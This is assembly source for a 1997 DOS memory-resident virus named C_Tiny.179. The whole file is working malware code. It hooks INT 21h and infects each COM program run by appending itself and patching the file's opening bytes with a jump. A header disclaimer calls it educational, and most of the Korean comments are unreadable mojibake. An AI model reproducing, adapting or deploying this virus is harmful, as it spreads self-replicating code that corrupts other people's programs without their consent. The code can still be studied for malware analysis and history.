;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     C_Tiny.179                              \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : C_Tiny.179
; Author     : Osiris
; Origin     : Corea
; Date       : 1997/12/07
;
; Type : Memory resident  COM
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �i�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; �e�e�e ���w�� �a����a�� ������a �B�� �����a�A �w���e�a. (0020:0000)
; �a����a �w���� �� �w�b�A �A����a ���a ���ᴡ �a�a. �e�� ���w�b�A 0 �� �a��
; �a�e �t�� ��w�A�� ���a�e �a����a�e ����w���A �w�� �a�� �g�e�a.
; �a����, COM �a���e �q�q��ǡ�a �q�q �a���e �a���� �� ������ 'M' ���� ���a �e�a
;
; �w�w �� ���e �A�a�a ��巡�a. ���e�i ϡ�a�� ���e ��� ���a�� �a�w�a�� �g�v
; �a.
;
; ������a �B�� �A���i�A �w�� �a�e �a����a�e �a���a �a�� �b�a�� �e�a.
;
; ���b�ⷥ ���w�� �a����a �A�b�A �|�� �A�e�ⷥ ���w���w�� ������a�B�� �A��
; �i�A �w�� �a�e �a����a���a.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE
            .286

 C_Tiny:
            DB    0E8h,00,00            ;
            pop   si                    ; �a����a ���b�� ���a��
            sub   si,0003               ; SI = �a����a ���b��

            push  si                    ; ��w
            xor   di,DI                 ;
            mov   ds,DI
            mov   cx, offset End_Virus  ; �a����a ���� �e�q ���a

 Check_IVT_Zero:
            cmp   byte ptr [DI+200h],0  ; ������a �����a�a 0 ���� ���a�e�a.
            jnz   Restore_COM_Head      ; �e�� ��� �t�� �a�� 0 �� �a�� �w���e
            inc   DI                    ; ����w���A �w�� �a�� �g�e�a
            loop  Check_IVT_Zero        ;

 Copy_Vir_IVT:
            mov   ax,0020h              ;
            mov   es,ax                 ;
            mov   cx, offset End_Virus  ; �a����a ����
            xor   di,di                 ; ���a �i �� (0020:0000h)
            db    2Eh                   ; CS:SI -> ES:DI
            repz  movsb                 ; ���a !

            mov   si, 0084h             ; Int 21h �����t �苡
            mov   di, offset Jmp_Org_Int21 + 1
            push  si
            movsw
            movsw

            pop   si                    ;
            cli                         ; Int 21h �a������
            mov   word ptr [SI], offset NewInt21
            mov   word ptr [SI+2], 0020h
            sti

 Restore_COM_Head:
            push  cs                    ; cs=ds=es
            pop   ds
            push  cs
            pop   es
            pop   si                    ; SI ����
            add   si, offset OldCOMHead ; COM �|���� ���� ���e
            mov   di,100h               ; COM �|���� ����
            push  di                    ;
            movsw                       ; 4 �a���a ����
            movsw                       ;
            ret                         ;

 OldCOMHead db    90h,90h,0CDh,20h      ; ���� COM �|����
            db   'C_Tiny'               ; �a����a ���q

 NewInt21:
            cmp   ah,4bh                ; ��З���a ?
            jnz   Jmp_Org_Int21

            pusha                       ; 286 + �A�� ����
            push  ds
            push  es

            mov   ax, 3D02h             ; �a�� ���e
            int   21h
            jc    Error

            xchg  ax,bx                 ; Ѕ�i �苡

            push  cs                    ; �A�a���a ɷ��
            pop   ds
            push  cs
            pop   es

            mov   ah, 3fh               ; �a�� ����
            mov   cx, 4                 ; �a���a��
            mov   dx, offset OldCOMHead ; �����t
            int   21h

            cmp   byte ptr OldCOMHead, 'M' ; �q�q�A���a / EXE �a�����a ?
            jz    Close

            mov   ax,4202h              ; �a�� �{�a�� ����
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   word ptr Jump_Code, 0E94Dh

            sub   ax,0004               ; ���a�t ���e
            mov   word ptr Jump_Code + 2, ax

            mov   ah, 40h               ; �a����a �a��
            mov   cx, offset End_Virus
            xor   dx,dx
            int   21h

            mov   ax,4200h              ; �a�� ��q�a�� ����
            xor   cx,cx
            xor   dx,dx
            int   21h

            mov   ah, 40h               ; �|���� �a��
            mov   cx, 4
            mov   dx, offset Jump_Code
            int   21h

 Close:
            mov   ah,3Eh                ; �a�� �h��
            int   21h
 Error:
            pop   es
            pop   ds
            popa
 Jmp_Org_Int21:
            db    0EAh                  ;
 End_Virus:
            dw    ?,?                   ;

 Jump_Code  dw    ?                     ; M, E9h
            db    ?,?                   ; ���a �t

 End_Memory:
            END   C_Tiny

